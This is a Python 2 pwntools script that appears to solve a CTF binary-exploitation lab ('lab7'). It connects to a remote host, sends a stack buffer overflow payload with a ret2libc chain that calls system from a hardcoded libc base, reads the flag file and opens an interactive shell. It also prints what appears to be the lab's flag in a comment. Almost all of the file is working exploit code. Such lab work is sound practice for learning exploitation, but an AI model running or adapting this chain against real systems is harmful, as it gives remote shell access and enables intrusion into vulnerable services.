#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{bhRXcxAzd3ZrsvVlPpQG}

context.arch = 'i386'

e = ELF('./lab7')

host , port = '35.194.234.201' , 2117

y = remote( host , port )

leave_ret = 0x08048418
pop_ebp = 0x0804856b

lsm_got = 0x8049ff8
read_got = 0x8049fe8
puts_got = 0x8049ff0
puts_plt = 0x8048390

ofs = 0x22400

l = 0xf7e19000

p = flat(
    'D' * 0x28,
    'RBBP',
    puts_plt,
    0,
    lsm_got
)

p = flat(
    'D' * 0x28,
    'RBBP',
    l + 0x03ada0,
    0,
    l + 0x15b9ab
)

system = 0x03ada0


y.sendafter( ':' , p )


y.sendline( 'cat ./flag.txt' )

#print y.recvline()
#libc = u32( y.recv(4) ) - 0x18540
#libc = u32( y.recv(4) )
#log.success( 'libc -> %s' % hex( libc ) )


y.interactive()

